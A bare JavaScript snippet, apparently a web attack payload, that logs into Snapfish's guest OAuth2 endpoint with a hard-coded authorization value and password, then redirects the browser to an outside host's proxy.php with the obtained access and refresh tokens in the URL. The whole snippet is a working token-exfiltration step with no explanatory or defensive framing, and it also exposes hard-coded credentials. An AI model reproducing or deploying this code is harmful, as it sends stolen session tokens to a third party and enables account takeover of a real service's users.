fetch("https://accounts.snapfish.com/v1/app/guest/oauth2", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Authorization": "d19c802262ba4bf5ba880c2c341e0b52"
  },
  body: JSON.stringify({
    globalInfo: {
      core: {
        firstName: "Guest",
        guid: "testexss1517@gmail.com",
        homeContext: "/hp/sf/sf-us/snapfish-us",
        lastName: "Guest",
        typeName: "guestCore"
      }
    },
    password: "P@ssword2025",
    typeName: "guestLoginRequest"
  })
})
.then(response => {
  if (!response.ok) throw new Error(`Erro: ${response.status}`);
  return response.json();
})
.then(data => {
  const accessToken = encodeURIComponent(data.access_token);
  const refreshToken = encodeURIComponent(data.refresh_token);
  window.location.href = `http://marciosz.infy.uk/proxy.php?access_token=${accessToken}&refresh_token=${refreshToken}`;
})
.catch(error => {
  console.error("Erro durante o processo:", error);
});
